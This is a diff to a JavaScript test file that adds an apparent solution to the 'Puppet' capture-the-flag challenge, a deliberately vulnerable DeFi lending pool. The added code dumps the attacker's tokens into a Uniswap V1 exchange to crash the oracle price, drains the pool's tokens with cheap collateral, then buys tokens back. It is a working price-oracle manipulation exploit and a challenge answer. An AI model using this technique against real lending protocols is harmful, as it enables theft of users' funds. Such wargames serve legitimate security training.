@@ -103,6 +103,57 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	//some UNISWAMP ABI
+/*this.uniswapExchange.getTokenToEthInputPrice
+
+TokenPurchase
+ethToTokenSwapInput
+ethToTokenTransferInput
+ethToTokenSwapOutput
+ethToTokenTransferOutput
+
+tokenToEthSwapInput    3 params
+tokenToEthTransferInput
+tokenToEthTransferOutput
+tokenToTokenSwapInput
+tokenToTokenTransferInput
+tokenToTokenSwapOutput
+tokenToTokenTransferOutput
+tokenToExchangeSwapInput
+tokenToExchangeTransferInput
+tokenToExchangeSwapOutput
+tokenToExchangeTransferOutput
+getEthToTokenInputPrice
+getEthToTokenOutputPrice
+
+getTokenToEthOutputPrice
+getTokenToEthInputPrice
+*/
+
+	await this.token.approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+//console.log(exchangeJson.abi);
+
+/*	const now = Math.floor(new Date().getTime() / 1000);
+	await this.uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE,1,now + 1000);
+	console.log("Uniswap balance of ETH: %s", await ethers.provider.getBalance(this.uniswapExchange.address));
+	console.log(`Price now is ${await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))}`);
+	await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+*/
+	const hackPool = this.lendingPool.connect(attacker);
+	const hackToken = this.token.connect(attacker);
+	const hackUniSwap = this.uniswapExchange.connect(attacker);
+
+	await hackToken.approve(hackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+	
+	await hackUniSwap.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, ethers.utils.parseEther("9"), (await ethers.provider.getBlock("latest")).timestamp * 2);
+	
+	const colateral = await hackPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+	await hackPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {value: colateral});
+
+	const necessaryEth = await hackUniSwap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, {gasLimit: 1e6});
+        await hackUniSwap.ethToTokenSwapOutput(ATTACKER_INITIAL_TOKEN_BALANCE, (await ethers.provider.getBlock('latest')).timestamp * 2, {value: necessaryEth});
+	 
+
     });
 
     after(async function () {
